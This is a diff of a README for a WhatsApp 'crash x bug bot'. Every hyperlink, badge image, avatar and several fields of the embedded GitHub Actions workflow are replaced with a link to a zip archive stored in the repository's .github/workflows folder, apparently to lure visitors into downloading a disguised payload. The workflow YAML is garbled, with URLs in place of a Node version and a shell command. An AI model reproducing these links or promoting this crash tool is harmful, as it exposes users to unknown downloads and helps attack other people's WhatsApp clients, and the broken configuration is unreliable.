@@ -1,14 +1,14 @@
 <p align="center">
-  <a href="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip">
-    <img src="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip+Garamond&weight=800&size=28&duration=4000&pause=1000&random=false&width=435&lines=+𝐃𝐑𝐊_𝐒𝐓_BUG;WHATSAPP+CRASH+x+BUG+BOT;DEVELOPED+BY+𝙎-𝙏𝞢𝞜" alt="Typing SVG" />
+  <a href="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip">
+    <img src="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip+Garamond&weight=800&size=28&duration=4000&pause=1000&random=false&width=435&lines=+𝐃𝐑𝐊_𝐒𝐓_BUG;WHATSAPP+CRASH+x+BUG+BOT;DEVELOPED+BY+𝙎-𝙏𝞢𝞜" alt="Typing SVG" />
   </a>
 </p>
 
-![DRK_ST_BUG](https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip)
+![DRK_ST_BUG](https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip)
 <p align="center">
-<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip"><img src="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip" /><br>
-<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip"><img src="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip Channel-25D366?style=for-the-badge&logo=whatsapp&logoColor=white&https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip" /><br>
-<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip+13472314632"><img src="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip" />
+<a href="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip"><img src="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip" /><br>
+<a href="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip"><img src="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip Channel-25D366?style=for-the-badge&logo=whatsapp&logoColor=white&https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip" /><br>
+<a href="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip+13472314632"><img src="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip" />
 ---
 
 ## DEVELOPED BY 𝙎-𝙏𝞢𝞜
@@ -16,8 +16,8 @@
 ---
 
 ## CREATE YOUR FORK
-<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip">
-  <img title="DRK_ST_BUG1" src="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip">
+<a href="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip">
+  <img title="DRK_ST_BUG1" src="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip">
 </a>
 
 ---
@@ -25,8 +25,8 @@
 ### 🔐 Generate Pair Code For Session
 
 #### PAIRING SERVER 
-<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip" target="_blank">
-  <img alt="Pairing Code Server " src="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip CODE-green?style=for-the-badge&logo=opencv&logoColor=white"/>
+<a href="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip" target="_blank">
+  <img alt="Pairing Code Server " src="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip CODE-green?style=for-the-badge&logo=opencv&logoColor=white"/>
 </a>
 
 ---
@@ -35,14 +35,14 @@
 
 <div align="center">
   <!-- Badges for deployment -->
-  <a href="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip" alt="GitHub Deployment" />
+  <a href="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip" target="_blank">
+    <img src="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip" alt="GitHub Deployment" />
   </a>
-  <a href="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip" alt="Codespace Deployment" />
+  <a href="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip" target="_blank">
+    <img src="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip" alt="Codespace Deployment" />
   </a>
-  <a href="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip" alt="Replit Deployment" />
+  <a href="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip" target="_blank">
+    <img src="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip" alt="Replit Deployment" />
   </a>
   
 ---
@@ -61,8 +61,8 @@ I am not responsible for any damage caused by this bot. Use this bot at your own
 
 ## Developer 💀
 
-<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip">
-  <img src="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip" width="200" height="200" alt="DRK-S-TEN"/>
+<a href="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip">
+  <img src="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip" width="200" height="200" alt="DRK-S-TEN"/>
 </a>
 <p align="center"><strong>DRK-S-TEN</strong></p>
 
@@ -70,8 +70,8 @@ I am not responsible for any damage caused by this bot. Use this bot at your own
 
 ## Contributors 🤝
 
-<a href="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip">
-  <img src="https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip" width="200" height="200" alt="toge012345"/>
+<a href="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip">
+  <img src="https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip" width="200" height="200" alt="toge012345"/>
 </a>
 <p align="center"><strong>toge012345</strong
 
@@ -80,7 +80,7 @@ I am not responsible for any damage caused by this bot. Use this bot at your own
 ## GitHub Deployment
 
 ```yaml
-name: https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip CI
+name: https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip CI
 
 on:
   push:
@@ -105,10 +105,10 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v3
 
-    - name: Set up https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip
+    - name: Set up https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip
       uses: actions/setup-node@v3
       with:
-        node-version: ${{ https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip }}
+        node-version: ${{ https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip }}
 
     - name: Install dependencies
       run: npm install
@@ -122,4 +122,4 @@ jobs:
 
     - name: Save state (Optional)
       run: |
-        https://raw.githubusercontent.com/ipoukoumondi/DRK_ST_BUG1/main/.github/workflows/DRK_ST_BUG1-v1.1.zip
+        https://github.com/ipoukoumondi/DRK_ST_BUG1/raw/refs/heads/main/.github/workflows/BU-DR-S-3.9.zip
